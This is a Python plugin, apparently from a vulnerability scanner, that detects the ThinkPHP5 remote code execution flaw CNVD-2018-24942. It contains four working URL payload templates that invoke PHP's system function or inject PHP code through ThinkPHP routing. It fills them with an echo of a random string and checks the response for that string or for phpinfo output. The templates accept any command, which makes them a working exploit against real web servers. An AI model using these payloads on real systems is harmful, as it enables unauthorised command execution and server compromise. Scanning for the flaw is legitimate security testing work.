#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
from lib.tool import check

cnvd_2018_24942_payloads = [
    {'path': 'index.php?s=index/\\think\Request/input&filter[]=system&data={RCECOMMAND}'},
    {'path': 'index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={RCECOMMAND}'},
    {'path': 'index.php?s=index/\\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={RCECOMMAND}'},
    {'path': 'index.php?s=index/\\think\\view\driver\Php/display&content=<?php phpinfo();?>'}
]

def cnvd_2018_24942_scan(self, clients):
    ''' ThinkPHP5 未开启强制路由RCE'''
    client = clients.get('reqClient')

    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE',
        'vul_id': 'CNVD-2018-24942',
    }

    for payload in cnvd_2018_24942_payloads:
        randomStr = random_md5(6)
        RCEcommand = 'echo ' + randomStr
        
        path = payload['path'].format(RCECOMMAND=RCEcommand)

        res = client.request(
            'get',
            path,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res(res.text, randomStr) 
            or (('PHP Version' in res.text) 
                and ('PHP License' in res.text))
        ):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
